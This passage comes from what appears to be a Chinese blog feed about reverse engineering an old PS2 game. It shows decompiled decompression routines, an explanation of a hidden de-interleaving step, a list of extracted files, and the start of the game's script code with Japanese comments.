class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>) + <span class="number">2</span>)) &#123;</span><br><span class="line">        length = (<span class="type">long</span>)(<span class="type">int</span>)end;</span><br><span class="line">      &#125;</span><br><span class="line">      *piVar3 = *piVar6;</span><br><span class="line">      *piVar6 = *piVar4;</span><br><span class="line">      *piVar4 = *piVar5;</span><br><span class="line">      *piVar5 = *piVar2;</span><br><span class="line">      *piVar2 = (<span class="type">int</span>)data;</span><br><span class="line">      instruction = data[<span class="number">1</span>];</span><br><span class="line">      data = data + <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> (pos &lt; length) &#123;</span><br><span class="line">        *pbVar9 = instruction;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span> ) &#123;</span><br><span class="line">          pbVar9 = (byte *)((<span class="type">int</span>)pos + <span class="number">1</span>);</span><br><span class="line">          pos = (ulong)(<span class="type">int</span>)pbVar9;</span><br><span class="line">          <span class="keyword">if</span> (length &lt;= pos) <span class="keyword">break</span>;</span><br><span class="line">          *pbVar9 = instruction;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LAB_00116120:</span><br><span class="line">      length = pos - uVar8;</span><br><span class="line">      <span class="keyword">if</span> (uVar7 &lt; pos) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* command == 7 */</span></span><br><span class="line">      command = (uint)(instruction &gt;&gt; <span class="number">5</span>);</span><br><span class="line">      <span class="keyword">if</span> ((instruction &amp; <span class="number">0xe0</span>) == <span class="number">0xe0</span>) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">5</span>] = *<span class="built_in">queue</span>[<span class="number">4</span>];</span><br><span class="line">        piVar2 = <span class="built_in">queue</span>[<span class="number">2</span>];</span><br><span class="line">        piVar4 = <span class="built_in">queue</span>[<span class="number">1</span>];</span><br><span class="line">        length = (<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>));</span><br><span class="line">        <span class="keyword">if</span> (uVar7 &lt; (ulong)(<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>))) &#123;</span><br><span class="line">          length = uVar7;</span><br><span class="line">        &#125;</span><br><span class="line">        *piVar3 = *piVar6;</span><br><span class="line">        piVar3 = <span class="built_in">queue</span>[<span class="number">0</span>];</span><br><span class="line">        *piVar6 = *piVar2;</span><br><span class="line">        *piVar2 = *piVar4;</span><br><span class="line">        *piVar4 = *piVar3;</span><br><span class="line">        *piVar3 = (<span class="type">int</span>)data;</span><br><span class="line">        <span class="keyword">for</span> (; data = data + <span class="number">1</span>, pos &lt;= length; pos = (ulong)(<span class="type">int</span>)((byte *)pos + <span class="number">1</span>)) &#123;</span><br><span class="line">          *(byte *)pos = *data;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LAB_00116120;</span><br><span class="line">      &#125;</span><br><span class="line">      ref_0 = (byte *)(&amp;DAT_00261390)[command];</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">4</span> &lt; command) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">5</span>] = *<span class="built_in">queue</span>[<span class="number">4</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">3</span> &lt; command) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">4</span>] = *<span class="built_in">queue</span>[<span class="number">3</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">2</span> &lt; command) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">3</span>] = *<span class="built_in">queue</span>[<span class="number">2</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">1</span> &lt; command) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">2</span>] = *<span class="built_in">queue</span>[<span class="number">1</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      piVar4 = <span class="built_in">queue</span>[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> (command != <span class="number">0</span>) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">1</span>] = *<span class="built_in">queue</span>[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      *piVar4 = (<span class="type">int</span>)ref_0;</span><br><span class="line">                    <span class="comment">/* dp == 6 */</span></span><br><span class="line">      <span class="keyword">if</span> ((*ref_0 &amp; <span class="number">0xe0</span>) == <span class="number">0xc0</span>) &#123;</span><br><span class="line">        length = (<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>) + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (uVar7 &lt; (ulong)(<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>) + <span class="number">2</span>)) &#123;</span><br><span class="line">          length = (<span class="type">long</span>)(<span class="type">int</span>)end;</span><br><span class="line">        &#125;</span><br><span class="line">        instruction = ref_0[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (pos &lt; length) &#123;</span><br><span class="line">          *pbVar9 = instruction;</span><br><span class="line">          <span class="keyword">while</span>(<span class="literal">true</span> ) &#123;</span><br><span class="line">            pbVar9 = (byte *)((<span class="type">int</span>)pos + <span class="number">1</span>);</span><br><span class="line">            pos = (ulong)(<span class="type">int</span>)pbVar9;</span><br><span class="line">            <span class="keyword">if</span> (length &lt;= pos) <span class="keyword">break</span>;</span><br><span class="line">            *pbVar9 = instruction;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        bVar1 = uVar7 &lt; pos;</span><br><span class="line">LAB_001162d8:</span><br><span class="line">        <span class="keyword">if</span> (bVar1) &#123;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* dp == 7 */</span></span><br><span class="line">        <span class="keyword">if</span> ((*ref_0 &amp; <span class="number">0xe0</span>) == <span class="number">0xe0</span>) &#123;</span><br><span class="line">          ref_0 = ref_0 + <span class="number">1</span> + ((instruction &amp; <span class="number">0x1f</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">          length = (<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">3</span>));</span><br><span class="line">          <span class="keyword">if</span> (uVar7 &lt; (ulong)(<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">3</span>))) &#123;</span><br><span class="line">            length = (<span class="type">long</span>)(<span class="type">int</span>)end;</span><br><span class="line">          &#125;</span><br><span class="line">          bVar1 = uVar7 &lt; pos;</span><br><span class="line">          <span class="keyword">if</span> (pos &lt;= length) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">              *(byte *)pos = *ref_0;</span><br><span class="line">              pos = (ulong)(<span class="type">int</span>)((byte *)pos + <span class="number">1</span>);</span><br><span class="line">              ref_0 = ref_0 + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">while</span> (pos &lt;= length);</span><br><span class="line">            bVar1 = uVar7 &lt; pos;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LAB_001162d8;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      data = data + <span class="number">1</span>;</span><br><span class="line">      length = pos - uVar8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= length) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    instruction = *data;</span><br><span class="line">  &#125; <span class="keyword">while</span>(<span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>果然老哥没逆错，这个函数的内容和老哥逆出来的一样，从 <code>data</code> 中解压数据到 <code>dst</code> 中，<code>queue</code> 就是老哥的 <code>HISTORY</code>，表达式 <code>(xxx &amp; 0xe0) == 0xc0</code> 等价于 <code>xxx == 6</code>，<code>(xxx &amp; 0xe0) == 0xe0</code> 等价于 <code>xxx == 7</code>。</p><p>发现这个函数中也没有使用前面提到的文件中第 5~8 个字节（为了表达方便，我们记为 <code>unknown</code>），只用了前 4 个字节 <code>size</code>，那么就回到这个函数的调用者，看看调用者在执行完这个函数后会不会对 <code>dst</code> 做其他处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ulong <span class="title function_">decompress_chunk</span><span class="params">(byte *chunk,byte *result,<span class="type">long</span> param_3,<span class="type">long</span> param_4,<span class="type">long</span> param_5,</span></span><br><span class="line"><span class="params">                      undefined8 param_6)</span></span><br><span class="line">&#123;</span><br><span class="line">  byte *dst;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  ulong uVar2;</span><br><span class="line">  <span class="type">long</span> unknown;</span><br><span class="line">  <span class="type">long</span> lVar4;</span><br><span class="line">  ulong decompressed_size;</span><br><span class="line">  <span class="type">int</span> decompressed_size_1;</span><br><span class="line">  <span class="type">int</span> *buf [<span class="number">4</span>];</span><br><span class="line">  <span class="type">long</span> lVar3;</span><br><span class="line">  byte c4;</span><br><span class="line">  byte c5;</span><br><span class="line">  byte c6;</span><br><span class="line">  byte c7;</span><br><span class="line">  </span><br><span class="line">  lVar1 = (<span class="type">long</span>)(<span class="type">int</span>)result;</span><br><span class="line">  reset();</span><br><span class="line">  decompressed_size_1 = (uint)*chunk + (uint)chunk[<span class="number">3</span>] * <span class="number">0x1000000</span>;</span><br><span class="line">  lVar3 = (<span class="type">long</span>)decompressed_size_1;</span><br><span class="line">  c7 = chunk[<span class="number">7</span>];</span><br><span class="line">  c6 = chunk[<span class="number">6</span>];</span><br><span class="line">  decompressed_size_1 = decompressed_size_1 + (uint)chunk[<span class="number">2</span>] * <span class="number">0x10000</span> + (uint)chunk[<span class="number">1</span>] * <span class="number">0x100</span>;</span><br><span class="line">  c5 = chunk[<span class="number">5</span>];</span><br><span class="line">  lVar4 = (<span class="type">long</span>)(<span class="type">int</span>)((uint)c7 * <span class="number">0x1000000</span>);</span><br><span class="line">  c4 = chunk[<span class="number">4</span>];</span><br><span class="line">  decompressed_size = (ulong)decompressed_size_1;</span><br><span class="line">  <span class="built_in">malloc</span>((<span class="type">int</span> *)buf,decompressed_size);</span><br><span class="line">                    <span class="comment">/* try &#123; // try from 00116474 to 0011647b has its CatchHandler @ 001164dc */</span></span><br><span class="line">  dst = (byte *)extend_size(buf,<span class="number">0</span>);</span><br><span class="line">  decompress(chunk + <span class="number">8</span>,dst,<span class="number">1</span>,(<span class="type">long</span>)decompressed_size_1);</span><br><span class="line">  unknown = (<span class="type">long</span>)(<span class="type">int</span>)((uint)c4 + (uint)c7 * <span class="number">0x1000000</span> + (uint)c6 * <span class="number">0x10000</span> + (uint)c5 * <span class="number">0x100</span>);</span><br><span class="line">  uVar2 = decompressed_size;</span><br><span class="line">  FUN_00116348(dst,result,decompressed_size_1,unknown);</span><br><span class="line">  free_buf((<span class="type">int</span> *)buf,lVar1,uVar2,unknown,param_5,param_6,lVar3,lVar4);</span><br><span class="line">  <span class="keyword">return</span> decompressed_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>chunk</code> 就是一个文件的内容，dst 是 <code>decompress</code> 解压的输出，可以看到第 33 行执行完 <code>decompress</code> 后，取出 <code>chunk</code> 的第 5～8 个字节小端转换为 int 作为 <code>unknown</code>，最终带着 <code>dst</code>、为压缩文件大小 <code>decompress_size</code> 和 <code>unknown</code> 调用了 <code>FUN_00116348</code> 函数，并且结果放在 <code>result</code> 中，作为 <code>decompress_chunk</code> 函数的返回结果。</p><p>那么很明显，<code>FUN_00116348</code> 就是那个老哥没有逆干净的代码，进去看看这个函数用 <code>unknown</code> 干了啥。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FUN_00116348</span><span class="params">(byte *buf,byte *result,<span class="type">int</span> size,<span class="type">long</span> unknown)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> k;</span><br><span class="line">  byte *pos;</span><br><span class="line">  <span class="type">int</span> j;</span><br><span class="line">  </span><br><span class="line">  j = size / (<span class="type">int</span>)unknown;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (unknown == <span class="number">0</span>) &#123;</span><br><span class="line">    trap(<span class="number">7</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  k = j * (<span class="type">int</span>)unknown;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> &lt; j) &#123;</span><br><span class="line">    pos = buf;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span> ) &#123;</span><br><span class="line">      <span class="keyword">for</span> (; pos &lt; buf + k; pos = pos + j) &#123;</span><br><span class="line">        *result = *pos;</span><br><span class="line">        result = result + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      i = i + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (j &lt;= i) <span class="keyword">break</span>;</span><br><span class="line">      pos = buf + i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (; k &lt; size; k = k + <span class="number">1</span>) &#123;</span><br><span class="line">    *result = buf[k];</span><br><span class="line">    result = result + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>果然，我们前面的推理没错，<code>unknown</code> 确实作为一个常量参与解压计算，<code>FUN_00116348</code> 会基于 <code>unknown</code> 对 <code>decompress</code> 的结果进行新一轮解压，当 <code>unknown</code> 取值为 1 时，这个函数原封不动的复制 <code>buf</code> 到 <code>result</code> 中，这就是为什么老哥逆出来的解压算法只能成功解压 <code>unknown</code> 为 1 的文件。</p><p>最终，基于 <code>FUN_00116348</code> 的逆向结果，重新解压 <code>NORMAL</code> 的第 10 个文件 <code>SCENE_ID.LST</code>，这次解压出了正确的结果。</p><blockquote><p>此外，通过逆向可以发现，前文中发现 .BIN 中每个文件之间总是间隔大量 \xff 只是为了将文件对其到 0x800，便于寻址。</p></blockquote><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/6.jpg" alt="SCENE_ID.LSTs"></p>]]></content>
      
      
      <categories>
          
          <category> Hack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReverseEngineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某上古 PS2 游戏逆向（三）游戏脚本初步分析与反编译</title>
      <link href="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="脚本代码分析"><a href="# 脚本代码分析" class="headerlink" title="脚本代码分析"></a>脚本代码分析 </h1><p> 接下来就是要提取出每个声音所对应的文本，当然文本也不是凭空冒出来的，一定在某个文件中保存着文本，并且需要靠程序逻辑判断哪个文本播放哪个音频。</p><p>游戏中主要在以下几个地方存在执行逻辑：主程序在 CD 根目录 <code>SLPS_258.97</code> 中，位于扩展库 <code>IOP</code> 目录下的各个 <code>.IRX</code> 中，这两个都是 32 位的 MIPS，就算用 Ghidra 反编译也不太好逆，此外在提取 <code>SYSTEM.BIN</code> 的时候发现里面存在某种脚本语言的代码，并且用 Shift-JIS 编码写日语注释，相较于二进制文件，先看一看从 <code>SYSTEM.BIN</code> 中提取的脚本都干了什么。利用前文中的提取脚本，提取出了以下几个文件：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/Users/xxxxx/Desktop/xxxxx/SYSTEM_extracted</span><br><span class="line">├── 0_0_131e.dat</span><br><span class="line">├── 10_1f000_0.dat</span><br><span class="line">├── 11_1f000_8c5.dat</span><br><span class="line">├── 12_20000_1a60.dat</span><br><span class="line">├── 13_22000_1f01.dat</span><br><span class="line">├── 14_24000_56d1.dat</span><br><span class="line">├── 15_29800_306.dat</span><br><span class="line">├── 16_2a000_111d.dat</span><br><span class="line">├── 17_2b800_2dc.dat</span><br><span class="line">├── 18_2c000_1296.dat</span><br><span class="line">├── 19_2d800_4083.dat</span><br><span class="line">├── 1_1800_15e4.dat</span><br><span class="line">├── 20_32000_b12.dat</span><br><span class="line">├── 21_33000_4faa.dat</span><br><span class="line">├── 22_38000_114f.dat</span><br><span class="line">├── 23_39800_650.dat</span><br><span class="line">├── 24_3a000_f02.dat</span><br><span class="line">├── 25_3b000_8f7.dat</span><br><span class="line">├── 26_3c000_126e.dat</span><br><span class="line">├── 27_3d800_56f6.dat</span><br><span class="line">├── 28_43000_d330.dat</span><br><span class="line">├── 29_50800_288a.dat</span><br><span class="line">├── 2_3000_6f4.dat</span><br><span class="line">├── 30_53800_60e4.dat</span><br><span class="line">├── 31_5a000_c69.dat</span><br><span class="line">├── 32_5b000_8688.dat</span><br><span class="line">├── 33_63800_9d29.dat</span><br><span class="line">├── 34_6d800_796.dat</span><br><span class="line">├── 35_6e000_2821.dat</span><br><span class="line">├── 36_71000_527f6.dat</span><br><span class="line">├── 37_c3800_11bf5.dat</span><br><span class="line">├── 38_d5800_72ed.dat</span><br><span class="line">├── 39_dd000_21d0.dat</span><br><span class="line">├── 3_3800_4e02.dat</span><br><span class="line">├── 40_df800_22b8.dat</span><br><span class="line">├── 41_e2000_36f.dat</span><br><span class="line">├── 4_8800_7736.dat</span><br><span class="line">├── 5_10000_416e.dat</span><br><span class="line">├── 6_14800_1540.dat</span><br><span class="line">├── 7_16000_50ce.dat</span><br><span class="line">├── 8_1b800_27ed.dat</span><br><span class="line">└── 9_1e000_946.dat</span><br><span class="line"></span><br><span class="line">1 directory, 42 files</span><br></pre></td></tr></table></figure><p>首先看看 <code>0_0_131e.dat</code> 中的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line">// XXX 画面サイズ定義</span><br><span class="line">SCWIDTH  &lt;- 640;</span><br><span class="line">SCHEIGHT &lt;- 448;</span><br><span class="line"></span><br><span class="line">EMPTY &lt;- &#123;&#125;; // 空の辞書</span><br><span class="line"></span><br><span class="line">savef &lt;- null; // ゲーム変数セーブ処理用</span><br><span class="line">f     &lt;- &#123;&#125;; // ゲーム変数</span><br><span class="line">sf    &lt;- &#123;&#125;; // システム変数</span><br><span class="line">tf    &lt;- &#123;&#125;; // テンポラリ変数</span><br><span class="line"></span><br><span class="line">variables    &lt;- null; // 変数情報</span><br><span class="line">voiceConfigs &lt;- null; // ボイスコンフィグ情報</span><br><span class="line">vconfigs &lt;- null;</span><br><span class="line"></span><br><span class="line">VAR_GAME   &lt;- 0;</span><br><span class="line">VAR_SYSTEM &lt;- 1;</span><br><span class="line">VAR_TEMP   &lt;- 2;</span><br><span class="line">VAR_SYSTEMWORK &lt;- 3;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 変数の初期化</span><br><span class="line"> * @param variables 変数情報</span><br><span class="line"> * @param zone 0: ゲーム変数 1: システム変数 2: テンポラリ</span><br><span class="line"> */</span><br><span class="line">function initVariables(variables, zone)</span><br><span class="line">&#123;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            switch (info.zone) &#123;</span><br><span class="line">            case VAR_SYSTEM:</span><br><span class="line">                sf[info.name] &lt;- 0;</span><br><span class="line">                break;</span><br><span class="line">            case VAR_TEMP:</span><br><span class="line">                tf[info.name] &lt;- 0;</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                f[info.name] &lt;- 0;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    savef = clone f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function storeVariables(variables, zone, ...)</span><br><span class="line">&#123;</span><br><span class="line">    local no = 0;</span><br><span class="line">    local store = null;</span><br><span class="line">    if (vargc &gt; 0) &#123;</span><br><span class="line">        no = vargv[0];</span><br><span class="line">        if (vargc &gt; 1) &#123;</span><br><span class="line">            store = vargv[1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    initFlag(zone, no);</span><br><span class="line">    if (zone == VAR_SYSTEMWORK) &#123;</span><br><span class="line">        zone = VAR_SYSTEM;</span><br><span class="line">    &#125;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            local var;</span><br><span class="line">            switch (zone) &#123;</span><br><span class="line">            case VAR_GAME:</span><br><span class="line">                var = savef[info.name];</span><br><span class="line">                break;</span><br><span class="line">            case VAR_SYSTEM:</span><br><span class="line">                var = sf[info.name];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if (store != null) &#123;</span><br><span class="line">                store[info.name] &lt;- var;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                switch(info.type) &#123;</span><br><span class="line">                case 0: // 数値</span><br><span class="line">                    if (var != null) &#123;</span><br><span class="line">                        dm(&quot; セーブパラメータ：&quot; + 